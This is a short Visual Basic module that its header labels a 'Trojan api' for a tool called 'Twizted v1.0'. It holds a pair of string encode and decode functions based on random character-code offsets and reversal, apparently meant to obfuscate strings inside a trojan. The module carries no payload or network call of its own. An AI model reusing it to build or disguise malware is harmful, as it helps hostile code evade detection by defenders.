Attribute VB_Name = "CRYPT"
'Trojan api By Xx_smarthacker_xX, Moisty
'For Twizted v1.0

Option Explicit

Public Function Cript(ByVal cString As String)
   On Error Resume Next

   Dim nRandomico1 As Integer
   Dim nRandomico2 As Integer
   Dim cCaracter As String * 3
   Dim cRetorno As String
   Dim nLoop As Long

   Randomize Timer
   nRandomico1 = 0
   While nRandomico1 < 35 Or nRandomico1 > 122
      nRandomico1 = Int((122 * Rnd) + 35)
   Wend

   nRandomico2 = 0
   While nRandomico2 < 35 Or nRandomico2 > 122 Or nRandomico2 = nRandomico1
      nRandomico2 = Int((122 * Rnd) + 35)
   Wend

   For nLoop = 1 To Len(cString)
       If (nLoop Mod 2) = 0 Then
          cCaracter = CStr(Asc(Mid(cString, nLoop, 1)) + nRandomico1)
       Else
          cCaracter = CStr(Asc(Mid(cString, nLoop, 1)) + nRandomico2)
       End If

       cRetorno = cRetorno + cCaracter
   Next

   cString = ""
   For nLoop = Len(cRetorno) To 1 Step -1
       cString = cString + Mid(cRetorno, nLoop, 1)
   Next

   Cript = cString + Chr(nRandomico2) + Chr(nRandomico1)
End Function

Public Function Decript(ByVal cString As String)
   On Error Resume Next

   Dim nRandomico1 As Integer
   Dim nRandomico2 As Integer
   Dim cRetorno As String
   Dim nLoop As Long

   nRandomico1 = Asc(Right(cString, 1))
   nRandomico2 = Asc(Left(Right(cString, 2), 1))

   cString = Left(cString, Len(cString) - 2)

   cRetorno = ""
   For nLoop = Len(cString) To 1 Step -1
       cRetorno = cRetorno + Mid(cString, nLoop, 1)
   Next

   cString = ""
   For nLoop = 1 To Len(cRetorno) Step 3
       If (nLoop Mod 2) = 0 Then
          cString = cString + Chr(Val(Mid(cRetorno, nLoop, 3)) - nRandomico1)
       Else
          cString = cString + Chr(Val(Mid(cRetorno, nLoop, 3)) - nRandomico2)
       End If
   Next

   Decript = cString
End Function
